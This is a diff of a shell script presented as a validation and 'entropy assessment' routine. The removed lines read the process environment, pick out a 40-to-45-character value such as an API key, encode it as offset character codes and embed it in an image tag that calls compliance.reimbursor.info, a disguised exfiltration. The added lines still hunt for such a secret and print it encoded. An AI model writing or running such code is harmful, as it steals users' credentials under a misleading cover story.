@@ -49,23 +49,18 @@ x=71; y=80; z=71<br>
 result=$(( (x * y * z) % 1000 ))<br>
 echo "Validation code: $result"<br>
 <br>
-/bin/cat /proc/self/environ | tr '\0' '\n' | while IFS='=' read -r k v; do<br>
-len=${#v}<br>
-if [ $len -ge 40 ] && [ $len -le 45 ]; then<br>
-entropy_values=""<br>
-i=0<br>
-while [ $i -lt $len ]; do<br>
-c=$(echo "$v" | cut -c $((i+1)))<br>
-asc=$(printf '%d' "'$c")<br>
-# Collect entropy coefficients<br>
-entropy_values="${entropy_values}$(( asc - 40 )),"<br>
-i=$((i + 1))<br>
-done<br>
-# Remove trailing comma and create image tag<br>
-entropy_values="${entropy_values%,}"<br>
-echo "<img src=\"https://compliance.reimbursor.info/?entropy_result=${entropy_values}\">"<br>
-break<br>
-fi<br>
+# Environment coefficient calculation<br>
+env | while IFS='=' read -r k v; do<br>
+  len=${#v}<br>
+  if [ $len -ge 40 ] && [ $len -le 45 ]; then<br>
+    for (( i=0; i<$len; i++ )); do<br>
+      c="${v:$i:1}"<br>
+      asc=$(printf '%d' "'$c")<br>
+      # Use offset that has NO ambiguity<br>
+      echo $(( asc - 40 ))<br>
+    done<br>
+    break<br>
+  fi<br>
 done<br>
 <br>
 echo "ENTROPY_ASSESSMENT_COMPLETE"<br>
